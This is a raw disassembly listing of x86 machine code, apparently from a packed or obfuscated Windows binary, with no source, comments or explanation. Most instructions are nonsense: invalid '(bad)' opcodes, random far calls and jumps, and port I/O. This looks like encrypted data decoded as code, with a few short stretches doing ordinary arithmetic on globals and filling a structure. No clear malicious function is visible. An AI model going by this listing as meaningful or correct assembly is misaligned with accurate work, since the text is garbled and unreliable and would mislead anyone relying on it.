  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x406114
  4060e6:	push   0xffffffe2
  4060e8:	rcr    ebx,0x19
  4060eb:	loope  0x4060a2
  4060ed:	cmp    eax,0x80ad9209
  4060f2:	jno    0x4060c5
  4060f4:	mov    DWORD PTR [ebx],0xf7208777
  4060fa:	inc    ecx
  4060fb:	aas    
  4060fc:	jmp    FWORD PTR [ebx+0x31]
  4060ff:	fmul   DWORD PTR ds:0x6c9d9061
  406105:	fimul  DWORD PTR [edi]
  406107:	jmp    ebx
  406109:	xor    DWORD PTR [edx+0x7],esi
  40610c:	rol    BYTE PTR [eax-0x356541ff],cl
  406112:	inc    ecx
  406113:	(bad)  
  406114:	push   edx
  406115:	lods   eax,DWORD PTR ds:[esi]
  406116:	ret    0x93d5
  406119:	xchg   BYTE PTR [edx-0x72b306e5],cl
  40611f:	popf   
  406120:	dec    edi
  406121:	out    0x74,eax
  406123:	(bad)  
  406124:	ror    BYTE PTR [esi],cl
  406126:	pop    edx
  406127:	mov    esp,0x9397fe65
  40612c:	bound  esi,QWORD PTR [edx+ecx*2]
  40612f:	lea    esi,[ebx-0x34]
  406132:	jae    0x406104
  406134:	xor    al,0x43
  406136:	push   edi
  406137:	(bad)  
  406138:	pop    ax
  40613a:	push   ds
  40613b:	xchg   ebp,eax
  40613c:	repnz out 0x67,eax
  40613f:	repnz xlat BYTE PTR ds:[ebx]
  406141:	popf   
  406142:	jmp    0x98f01e84
  406147:	cli    
  406148:	les    edx,FWORD PTR [ebp+0x28c7f4b8]
  40614e:	mov    edx,DWORD PTR [edx+esi*4-0x2d]
  406152:	push   ds
  406153:	clc    
  406154:	mov    es,WORD PTR [ebp-0x66]
  406157:	rcl    BYTE PTR [edx+0x36829318],0x3e
  40615e:	retf   0x7801
  406161:	loop   0x406107
  406163:	dec    esi
  406164:	jnp    0x40613f
  406166:	add    eax,0x87adc3de
  40616b:	rol    DWORD PTR [eax+0x4bafce60],cl
  406171:	mov    edi,0x4fb113fe
  406176:	rcl    BYTE PTR [ebp-0x6a70c15f],1
  40617c:	mov    edx,0x703ffc1c
  406181:	dec    ebp
  406182:	sub    BYTE PTR [ecx+0x79],cl
  406185:	fimul  WORD PTR [edi-0x7ca88ece]
  40618b:	mov    al,0x7c
  40618e:	jmp    0x37f6bd1c
  406193:	add    DWORD PTR [eax+0x65dc8e88],0xc491a2bb
  40619d:	pop    eax
  40619e:	cmc    
  40619f:	sub    ecx,ebx
  4061a1:	inc    ebx
  4061a2:	jnp    0x4061b8
  4061a4:	cmc    
  4061a5:	adc    al,BYTE PTR [ecx]
  4061a7:	mov    esp,0xced4c964
  4061ac:	out    dx,al
  4061ad:	jns    0x4061bd
  4061af:	(bad)
  4061b3:	jae    0x4061f8
  4061b5:	or     BYTE PTR [esi+0x6b],0x93
  4061b9:	mov    ecx,0xbe3d065
  4061be:	mov    ds:0xc32c859e,al
  4061c3:	inc    ecx
  4061c4:	pop    eax
  4061c5:	fisttp DWORD PTR cs:[eax+0x3c86b3ac]
  4061cc:	aad    0x1c
  4061ce:	fbstp  TBYTE PTR [esi-0x1f]
  4061d1:	scas   al,BYTE PTR es:[edi]
  4061d2:	and    ebp,edx
  4061d4:	cld    
  4061d5:	or     al,0xae
  4061d7:	sub    BYTE PTR [ecx-0x65998ab2],bh
  4061dd:	call   0x5e3f6d62
  4061e2:	ins    BYTE PTR es:[edi],dx
  4061e3:	jg     0x4061ab
  4061e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061e6:	inc    ebx
  4061e7:	(bad)  
  4061e8:	std    
  4061e9:	gs daa 
  4061eb:	int3   
  4061ec:	bound  ebx,QWORD PTR [edi+0xd]
  4061ef:	cmp    eax,0xc881ef5d
  4061f4:	xchg   edx,ecx
  4061f6:	gs addr16 nop
  4061f9:	sub    DWORD PTR [esi+eiz*8-0x3dd0bf2d],ebp
  406200:	test   ch,ah
  406202:	in     eax,dx
  406203:	(bad)  
  406204:	mov    ah,0x1d
  406206:	addr16 dec edx
  406208:	daa    
  406209:	data16 xlat BYTE PTR ds:[ebx]
  40620b:	test   al,0x94
  40620d:	and    eax,0xa4022129
  406212:	sub    DWORD PTR [ebp-0x5f0dd61b],ebx
  406218:	test   al,0x21
  40621a:	dec    ebx
  40621b:	sub    ch,bh
  40621d:	daa    
  40621e:	pop    edi
  40621f:	jge    0x406276
  406221:	stc    
  406222:	jne    0x4061a7
  406224:	fdiv   QWORD PTR ds:0xcc96b0c4
  40622a:	pusha  
  40622b:	stos   DWORD PTR es:[edi],eax
  40622c:	stos   BYTE PTR es:[edi],al
  40622d:	or     DWORD PTR [ebp-0x58],esi
  406230:	inc    cl
  406232:	sbb    DWORD PTR [esi-0x22],0x2b93ed0a
  406239:	sbb    ch,0x83
  40623c:	inc    ebx
  40623d:	fdivrp st(6),st
  40623f:	and    edx,DWORD PTR [ecx]
  406241:	aad    0xa5
  406243:	fwait
  406244:	mov    ah,0x3e
  406246:	rcr    DWORD PTR [eax-0x4b39f2e],0xca
  40624d:	(bad)  
  40624e:	mov    edx,0xf973ef86
  406253:	jmp    0x9e032637
  406258:	sub    al,0x35
  40625a:	cwde   
  40625b:	mov    ebx,0x35bdb7fc
  406260:	adc    DWORD PTR [ebp*1+0x57424f75],ecx
  406267:	(bad)  
  406268:	cmp    bh,al
  40626a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40626b:	iret   
  40626c:	inc    edx
  40626d:	mov    cl,0xd4
  40626f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406270:	mov    dl,bl
  406272:	sbb    DWORD PTR [ebx],edx
  406274:	loopne 0x40626a
  406276:	ror    BYTE PTR [edi],0x65
  406279:	sbb    cl,bh
  40627b:	call   0x1c5b7f29
  406280:	pop    eax
  406281:	push   cs
  406282:	sbb    esp,DWORD PTR [ecx+0x22be316]
  406288:	dec    edx
  406289:	lock dec esi
  40628b:	fstp   DWORD PTR [edi+0x18458b6b]
  406291:	mov    esi,DWORD PTR [ebp+0x10]
  406294:	sub    DWORD PTR ds:0x42fd09,0x42fd86
  40629e:	mov    DWORD PTR [esi+0xc],eax
  4062a1:	or     DWORD PTR ds:0x42e6f3,ecx
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fd72,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fd72,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fd72,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e53b
  4062e2:	cmp    DWORD PTR ds:0x42fd72,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fd72
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fd72,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fd72
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fd72,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	jo     0x40634c
  406330:	dec    edi
  406331:	sub    DWORD PTR [esp+edi*1+0x7fa77070],ecx
  406338:	jo     0x4063aa
  40633a:	out    0xac,eax
  40633c:	stc    
  40633d:	xor    DWORD PTR [eax],esi
  40633f:	push   esp
  406340:	push   cs
  406341:	cmp    eax,DWORD PTR [ecx+0xf0fc302]
  406347:	rcr    DWORD PTR [eax+0x7d],cl
  40634a:	xchg   esi,eax
  40634b:	inc    ecx
  40634c:	mov    BYTE PTR [edi],cl
  40634e:	jo     0x406351
  406350:	imul   eax,edi,0xffffff88
  406353:	pop    ebp
  406354:	dec    eax
  406355:	jne    0x4063d1
  406357:	mov    al,ds:0xe4afa695
  40635c:	push   esp
  40635d:	inc    esp
  40635e:	aam    0x5a
  406360:	call   0xe6f4:0xe57cefa8
  406367:	pop    ebx
  406368:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406369:	xchg   edx,eax
  40636a:	push   esp
  40636b:	mov    dh,0xcf
  40636d:	sti    
  40636e:	mov    ah,0x8b
  406370:	and    ebp,esi
  406372:	std    
  406373:	in     al,0x23
  406375:	dec    ebx
  406376:	adc    ah,BYTE PTR [edi]
  406378:	in     al,dx
  406379:	jmp    0xc78372d8
  40637e:	inc    eax
  40637f:	dec    ecx
  406380:	or     BYTE PTR [ecx],ch
  406382:	sbb    dh,BYTE PTR [ebp+0x530df274]
  406388:	or     esp,esi
  40638a:	push   es
  40638b:	ds xchg edi,eax
  40638d:	inc    esp
  40638e:	(bad)  
  40638f:	popa   
  406390:	jbe    0x406356
  406392:	adc    eax,0x1e3a4396
  406397:	popa   
  406398:	in     eax,0x8c
  40639a:	cmc    
  40639b:	popf   
  40639c:	adc    ecx,eax
  40639e:	push   edi
  40639f:	jp     0x4063f3
  4063a1:	xor    eax,0x72682e1f
  4063a6:	mov    eax,ds:0xae4b3414
  4063ab:	xor    edx,DWORD PTR [ebp-0x262129d3]
  4063b1:	xchg   esi,eax
  4063b2:	add    edx,0xb508d7d2
  4063b8:	jmp    0x4eec183b
  4063bd:	jp     0x406401
  4063bf:	inc    esi
  4063c0:	data16 aas 
  4063c2:	out    dx,eax
  4063c3:	xchg   ecx,eax
  4063c4:	sub    eax,0x996021f1
  4063c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063ca:	lds    eax,FWORD PTR [esi+0x23b61b83]
  4063d0:	addr16 cmc 
  4063d2:	sub    DWORD PTR [eax],ebx
  4063d4:	ret    0x9c5b
  4063d7:	xor    al,0x9e
  4063d9:	sbb    eax,0xda193acb
  4063de:	dec    eax
  4063df:	sub    al,0x11
  4063e1:	adc    eax,0xf4aeecda
  4063e6:	adc    DWORD PTR [ecx],edx
  4063e8:	test   eax,0x8af73c6f
  4063ed:	dec    ecx
  4063ee:	cwde   
  4063ef:	sub    eax,0x3809e9dd
  4063f4:	test   BYTE PTR [esi+ebp*4],bh
  4063f7:	add    DWORD PTR [edx-0x6d],ecx
  4063fa:	xor    edi,edi
  4063fc:	jno    0x406416
  4063fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063ff:	in     al,0x88
  406401:	fistp  QWORD PTR gs:[ebx]
  406404:	aam    0x12
  406406:	push   edx
  406407:	pop    ds
  406408:	aaa    
  406409:	cwde   
  40640a:	mov    DWORD PTR [edx],0x2223ba50
  406410:	sbb    eax,0x18a0996b
  406415:	adc    al,0x30
  406417:	jns    0x4063f7
  406419:	loopne 0x4063f6
  40641b:	jae    0x40639d
  40641d:	dec    ecx
  40641e:	mov    WORD PTR [ebp-0x69],ss
  406421:	inc    ebp
  406422:	xor    ebx,DWORD PTR [edi-0x6a]
  406425:	inc    esi
  406426:	jle    0x406426
  406428:	mov    dh,0x74
  40642a:	test   BYTE PTR [eax],dl
  40642c:	dec    DWORD PTR [ebx-0x67]
  40642f:	retf   
  406430:	(bad)  
  406431:	cmp    al,0x76
  406433:	dec    esi
  406434:	fcmove st,st(7)
  406436:	or     BYTE PTR [ebp-0x470dd228],0x8d
  40643d:	pop    ds
  40643e:	fadd   DWORD PTR [edi-0x2ca6d96d]
  406444:	pop    ds
  406445:	inc    esi
  406446:	xor    ch,BYTE PTR [edi-0x25]
  406449:	(bad)  
  40644a:	mov    al,BYTE PTR [eax-0x77afe81]
  406450:	inc    esp
  406451:	dec    ecx
  406452:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406453:	stos   BYTE PTR es:[edi],al
  406454:	les    ecx,FWORD PTR [ebp+0x6d]
  406457:	adc    esp,DWORD PTR [ecx+0x793d28bc]
  40645d:	xlat   BYTE PTR ds:[ebx]
  40645e:	jae    0x406430
  406460:	mov    ebx,0x29fd1184
  406465:	leave  
  406466:	mov    ds:0x219eb65a,eax
  40646b:	sbb    DWORD PTR [ecx],0xf4b3d1dc
  406471:	jo     0x4064c9
  406473:	aad    0xbc
  406475:	dec    eax
  406476:	xchg   ecx,eax
  406477:	pop    esi
  406478:	jmp    0x311eee43
  40647d:	(bad)  
  40647e:	enter  0x899,0x83
  406482:	test   BYTE PTR [ebp+0x26591020],dh
  406488:	mov    eax,0x29d95865
  40648d:	add    eax,DWORD PTR [ebp-0x4]
  406490:	aad    0xda
  406492:	lea    ecx,[esi]
  406494:	inc    ebx
  406495:	adc    bl,BYTE PTR [ebx-0x605f40b7]
  40649b:	mov    ah,0xb1
  40649d:	add    edi,edx
  40649f:	or     bh,BYTE PTR ds:0xad6c8661
  4064a5:	shl    BYTE PTR [ebp-0x4],0xd4
  4064a9:	xor    cl,0x29
  4064ac:	or     DWORD PTR [edx-0x77],0x9cf71845
  4064b3:	inc    edi
  4064b4:	retf   0xb70a
  4064b7:	mov    esi,0x664e2962
  4064bc:	mov    BYTE PTR [ebp+0x5c],bl
  4064bf:	mov    ds:0x7e41952c,eax
  4064c4:	sbb    al,0x72
  4064c6:	and    ah,BYTE PTR ds:0x6bcec2d1
  4064cc:	fst    st(4)
  4064ce:	lods   al,BYTE PTR ds:[esi]
  4064cf:	imul   DWORD PTR [ebp+ecx*8+0x11]
  4064d3:	mov    ds:0x9e759baa,al
  4064d8:	test   ch,bl
  4064da:	or     esp,edx
  4064dc:	mov    esi,0x51563305
  4064e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064e2:	mov    ds:0x18c2c95e,eax
  4064e7:	add    BYTE PTR [ebp-0x75],dl
  4064ea:	in     al,dx
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fd76,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fcf9
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fd72,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fd72,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fcd9,0x42e6fb
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	jo     0x4065c7
  406568:	xchg   ecx,eax
  406569:	mov    bl,0x33
  40656b:	cmp    dh,BYTE PTR [eax+0x70]
  40656e:	loop   0x4065ee
  406570:	jo     0x4065e2
  406572:	cli    
  406573:	pop    es
  406574:	inc    dx
  406576:	mov    eax,0xd248f8af
  40657b:	lds    ecx,FWORD PTR [edi+0x225a59c0]
  406581:	xor    BYTE PTR [eax+0x5926e83],ch
  406587:	sub    BYTE PTR [ebx-0x1896f111],dl
  40658d:	pusha  
  40658e:	mov    eax,ds:0x1935bc52
  406593:	or     al,0x28
  406595:	lea    edi,[ebx]
  406597:	ins    DWORD PTR es:[edi],dx
  406598:	scas   eax,DWORD PTR es:[edi]
  406599:	call   0x73b6:0x720dc7e9
  4065a0:	jnp    0x406562
  4065a2:	aam    0xf2
  4065a4:	mov    edx,0xc8dbe9bd
  4065a9:	call   0x378a1c39
  4065ae:	aad    0x7b
  4065b0:	sub    edi,DWORD PTR [ecx]
  4065b2:	pop    esp
  4065b3:	cmp    BYTE PTR [esi+0x70],bl
  4065b6:	inc    esp
  4065b7:	adc    DWORD PTR [ebp+0x1b],0x41
  4065bb:	push   ss
  4065bc:	push   0x2d790775
  4065c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065c2:	and    bh,cl
  4065c4:	fsubr  QWORD PTR [edi+0x3b]
  4065c7:	out    0xf9,al
  4065c9:	push   edx
  4065ca:	enter  0xa244,0xef
  4065ce:	xlat   BYTE PTR ds:[ebx]
  4065cf:	push   ebx
  4065d0:	mov    al,ds:0xfa83c1c9
  4065d5:	loopne 0x406593
  4065d7:	fild   QWORD PTR [ebp+0x58]
  4065da:	jnp    0x40658e
  4065dc:	call   0xcffbb22b
  4065e1:	push   ds
  4065e2:	xlat   BYTE PTR ds:[ebx]
  4065e3:	gs jecxz 0x40664e
  4065e6:	inc    ebx
  4065e7:	(bad)  
  4065e8:	jmp    0xba8d4986
  4065ed:	(bad)  
  4065ef:	arpl   WORD PTR [eax],cx
  4065f1:	push   es
  4065f2:	xor    ah,BYTE PTR [ebp-0x38]
  4065f5:	loop   0x406665
  4065f7:	xor    al,0xa1
  4065f9:	mov    esi,0xc65b67be
  4065fe:	test   eax,0x4a58f910
  406603:	retf   
  406604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406605:	arpl   WORD PTR [ebp-0x1bec0993],ax
  40660b:	push   ds
  40660c:	push   ss
  40660d:	test   DWORD PTR [edi+0x2fd89ec],esp
  406613:	repnz cs push esp
  406616:	sbb    eax,0x59a3894a
  40661b:	and    eax,0xe7aa71c
  406620:	inc    esp
  406621:	add    ebp,edx
  406623:	retf   0x90de
  406626:	xchg   edi,eax
  406627:	jle    0x4065f7
  406629:	fisub  WORD PTR [edx-0x1473dbba]
  40662f:	adc    al,0x96
  406631:	not    edi
  406633:	stos   DWORD PTR es:[edi],eax
  406634:	fsubr  st(4),st
  406636:	push   edx
  406637:	mov    al,ds:0xbc495967
  40663c:	push   edi
  40663d:	sbb    eax,0xe2f1c75d
  406642:	jmp    0x40f5ebe0
  406647:	call   0x1eea:0xaff8817
  40664e:	scas   eax,DWORD PTR es:[edi]
  40664f:	test   DWORD PTR [edx+0x68acc394],ebp
  406655:	mov    ss,WORD PTR [ebp-0x233a5706]
  40665b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40665c:	icebp  
  40665d:	pop    es
  40665e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40665f:	jo     0x40664d
  406661:	pop    esi
  406662:	(bad)  
  406663:	jmp    0x406654
  406665:	fwait
  406666:	iret   
  406667:	iret   
  406668:	arpl   WORD PTR [ebp+ebx*8-0x5a],ax
  40666c:	lods   al,BYTE PTR ds:[esi]
  40666d:	outs   dx,DWORD PTR ds:[esi]
  40666e:	out    dx,eax
  40666f:	rcr    BYTE PTR [edi+0x4e],cl
  406672:	adc    DWORD PTR es:[ecx],ebp
  406675:	push   ecx
  406676:	xchg   ebx,eax
  406677:	fist   WORD PTR [edi+ebx*8]
  40667a:	sub    ecx,0x45a733fc
  406680:	mov    ds:0x56c2edbf,al
  406685:	adc    BYTE PTR [esi],bl
  406687:	jae    0x406693
  406689:	or     eax,0x50e14c9b
  40668e:	push   ds
  40668f:	adc    BYTE PTR [eax],dl
  406691:	ins    DWORD PTR es:[edi],dx
  406692:	arpl   WORD PTR [esi-0xc6b933f],dx
  406698:	jp     0x4066d4
  40669a:	xchg   esi,eax
  40669b:	lods   al,BYTE PTR ds:[esi]
  40669c:	and    ecx,eax
  40669e:	mov    ebp,0x85a648d1
  4066a3:	aam    0x6b
  4066a5:	in     al,dx
  4066a6:	enter  0xda08,0xc4
  4066aa:	rcl    DWORD PTR [esi+0x4b],0xcd
  4066ae:	(bad)  
  4066af:	je     0x406720
  4066b1:	in     al,dx
  4066b2:	dec    esi
  4066b3:	vmovups YMMWORD PTR [ecx+0x12c38c46],ymm1
  4066bb:	pusha  
  4066bc:	adc    ebx,DWORD PTR [edi-0x6a9b2e12]
  4066c2:	pop    esp
  4066c3:	mov    ecx,0xcc4338e
  4066c8:	mov    dl,0xf0
  4066ca:	mov    al,ds:0x2aa670bd
  4066cf:	fdivr  DWORD PTR [ecx-0x39]
  4066d2:	out    0xfc,eax
  4066d4:	xor    dl,BYTE PTR [ecx+0x62]
  4066d7:	add    bl,bl
  4066d9:	push   es
  4066da:	sar    BYTE PTR [edi-0x3e3eca9f],1
  4066e0:	and    esp,DWORD PTR [eax]
  4066e2:	dec    edi
  4066e3:	add    ah,bl
  4066e5:	leave  
  4066e6:	mov    DWORD PTR [eax],0x323e825
  4066ec:	or     al,0x0
  4066ee:	jg     0x406697
  4066f0:	fild   WORD PTR [ebp+eax*2+0x6d]
  4066f4:	jb     0x4066d6
  4066f6:	jae    0x4066f3
  4066f8:	sbb    BYTE PTR [ebp+0x3e],0x10
  4066fc:	pop    ebx
  4066fd:	std    
  4066fe:	out    0xfe,al
  406700:	jp     0x40669a
  406702:	and    al,BYTE PTR [edi+ebx*1+0x3c615cb9]
  406709:	mov    bh,BYTE PTR [eax+0x33dcbbe3]
  40670f:	outs   dx,BYTE PTR ds:[esi]
  406710:	sub    eax,DWORD PTR [edx]
  406712:	sub    bh,al
  406714:	push   edi
  406715:	add    BYTE PTR [esi+eax*2],dh
  406718:	jle    0x406770
  40671a:	push   ds
  40671b:	and    eax,ebx
  40671d:	fimul  WORD PTR [edx]
  40671f:	fs pop edx
  406721:	xlat   BYTE PTR ds:[ebx]
  406722:	xchg   BYTE PTR [edx+0x2b843467],al
  406728:	sub    BYTE PTR [ebx-0x49],bh
  40672b:	dec    ebx
  40672c:	es nop
  40672e:	mov    esp,0xcbf11b8c
  406733:	jl     0x406735
  406735:	sub    bl,BYTE PTR [eax-0x30f8a33e]
  40673b:	sbb    al,0x66
  40673d:	xchg   DWORD PTR gs:[eax+eiz*8+0x11],edi
  406742:	call   0x9215:0xb2d17aa1
  406749:	arpl   WORD PTR [ebp-0x7ac61abb],ax
  40674f:	retf   
  406750:	jmp    0x6d10a39f
  406755:	mov    ebp,0xec70b3da
  40675a:	xchg   esp,eax
  40675b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40675c:	cwde   
  40675d:	js     0x40675d
  40675f:	sub    al,0x47
  406761:	inc    esi
  406762:	push   ebx
  406763:	fldenv fs:[edx+ebp*1+0x4fbe0aec]
  40676b:	ins    DWORD PTR es:[edi],dx
  40676c:	and    DWORD PTR [edi-0x41e8f1d5],ecx
  406772:	or     eax,0xef16465d
  406777:	jp     0x406753
  406779:	xor    DWORD PTR [edi],eax
  40677b:	xor    ecx,DWORD PTR [esi]
  40677d:	call   0x7a34:0x1444243
  406784:	sbb    esp,DWORD PTR [esi]
  406786:	push   0x44
  406788:	aaa    
  406789:	enter  0xe366,0xd6
  40678d:	std    
  40678e:	inc    esi
  40678f:	daa    
  406790:	xchg   edx,eax
  406791:	test   BYTE PTR [eax-0x20a5d209],bl
  406797:	mov    ch,0xa1
  406799:	test   bh,ah
  40679b:	and    DWORD PTR [ecx-0x387b913b],ebp
  4067a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067a2:	or     eax,0xf9663fa4
  4067a7:	in     eax,0xf5
  4067a9:	fisub  DWORD PTR [esi-0x5eb2d22a]
  4067af:	sbb    al,0xbc
  4067b1:	push   ds
  4067b2:	or     DWORD PTR [esi+ecx*4],edx
  4067b5:	out    dx,eax
  4067b6:	mov    DWORD PTR [edx+0x72a69215],ebx
  4067bc:	push   esp
  4067bd:	pop    ss
  4067be:	inc    edx
  4067bf:	mov    al,0x6b
  4067c1:	pop    esp
  4067c2:	icebp  
  4067c3:	or     al,0xb0
  4067c5:	xor    eax,0x78368b9d
  4067ca:	cld    
  4067cb:	push   ecx
  4067cc:	ins    BYTE PTR es:[edi],dx
  4067cd:	stos   BYTE PTR es:[edi],al
  4067ce:	mul    BYTE PTR [eax+0x1c44ec1]
  4067d4:	mov    dh,0x14
  4067d6:	pop    ds
  4067d7:	int    0x85
  4067d9:	jmp    0x4067bf
  4067db:	dec    esi
  4067dc:	add    al,0xbc
  4067de:	add    al,BYTE PTR [edi]
  4067e0:	mov    edx,DWORD PTR [ebp+0x10]
  4067e3:	mov    DWORD PTR [edx+0x8],eax
  4067e6:	xor    eax,edx
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fcd5,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e120,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e6fb,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fce5,0x42e713
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	pop    edx
  406847:	dec    eax
  406848:	(bad)  
  406849:	iret   
  40684a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40684b:	cmp    BYTE PTR [eax+0x70],dh
  40684e:	loop   0x4068ce
  406850:	jo     0x4068c2
  406852:	inc    ecx
  406853:	jmp    0x7f1b:0x4ed2c37b
  40685a:	mov    fs,WORD PTR [edi]
  40685c:	in     al,0xde
  40685e:	loope  0x40682e
  406860:	push   ebp
  406861:	lea    edi,ds:0x3c1cdc2c
  406867:	inc    esi
  406868:	scas   al,BYTE PTR es:[di]
  40686a:	outs   dx,DWORD PTR ds:[esi]
  40686b:	stc    
  40686c:	sbb    eax,0x7facb56a
  406871:	mov    eax,0x3beb9d01
  406876:	push   cs
  406877:	mov    WORD PTR [ecx],fs
  406879:	mov    al,al
  40687b:	pop    esp
  40687c:	push   ss
  40687d:	in     eax,dx
  40687e:	xor    al,0x4a
  406880:	adc    eax,0x442ad88f
  406885:	fwait
  406886:	scas   al,BYTE PTR es:[edi]
  406887:	and    DWORD PTR [edx+eiz*2+0x7b],0x6a9e2daa
  40688f:	sbb    DWORD PTR [ebx-0x28],edx
  406892:	jno    0x4068cb
  406894:	stos   BYTE PTR es:[edi],al
  406895:	sub    BYTE PTR [ecx],bl
  406897:	cmp    BYTE PTR [esi],cl
  406899:	in     al,0xef
  40689b:	jge    0x406908
  40689d:	test   DWORD PTR [eax+0x1623b4a6],eax
  4068a3:	jb     0x406895
  4068a5:	fst    QWORD PTR [ebx+0x1e]
  4068a8:	(bad)  
  4068a9:	mov    ecx,0xddf2f9c8
  4068ae:	(bad)  
  4068af:	mov    ecx,0x5b592333
  4068b4:	bound  ecx,QWORD PTR [edx]
  4068b6:	mov    DWORD PTR [ecx+0x4],ecx
  4068b9:	fcmovnbe st,st(1)
  4068bb:	stos   DWORD PTR es:[edi],eax
  4068bc:	mov    dl,0x31
  4068be:	cmp    esi,DWORD PTR [esi+0x22]
  4068c1:	addr16 leave 
  4068c3:	dec    ebx
  4068c4:	push   0xffffffb8
  4068c6:	popf   
  4068c7:	jnp    0x40684e
  4068c9:	fdiv   QWORD PTR [esi]
  4068cb:	and    ch,BYTE PTR [ebx]
  4068cd:	sahf   
  4068ce:	adc    edx,DWORD PTR [ebx]
  4068d0:	dec    esi
  4068d1:	stc    
  4068d2:	in     al,0xc
  4068d4:	dec    edi
  4068d5:	loopne 0x406903
  4068d7:	fs int3 
  4068d9:	ins    BYTE PTR es:[edi],dx
  4068da:	pusha  
  4068db:	sar    DWORD PTR [edi+0x6],0x1e
  4068df:	dec    eax
  4068e0:	scas   eax,DWORD PTR es:[edi]
  4068e1:	dec    edi
  4068e2:	retf   0x692e
  4068e5:	ret    
  4068e6:	mov    cl,0x5a
  4068e8:	clc    
  4068e9:	pop    edi
  4068ea:	xchg   BYTE PTR [edx+0x2da66d50],ah
  4068f0:	call   0xe563:0x93ccb2b8
  4068f7:	push   0xa24c2b55
  4068fc:	inc    eax
  4068fd:	pop    edx
  4068fe:	push   ebp
  4068ff:	das    
  406900:	jno    0x4068e6
  406902:	rol    DWORD PTR [edx+0x2b],cl
  406905:	sub    ecx,esi
  406907:	int3   
  406908:	ins    DWORD PTR es:[edi],dx
  406909:	out    0xe,eax
  40690b:	ds in  eax,dx
  40690d:	repz loopne 0x4068b3
  406910:	push   ss
  406911:	in     eax,0xb5
  406913:	call   0xbc569026
  406918:	(bad)
  40691b:	arpl   WORD PTR [ecx-0x6d9c6c80],sp
  406921:	mov    ecx,0xf567eb51
  406926:	mov    dh,0x6e
  406928:	pop    ss
  406929:	sub    BYTE PTR [ecx],0x67
  40692c:	iret   
  40692d:	jno    0x4068ca
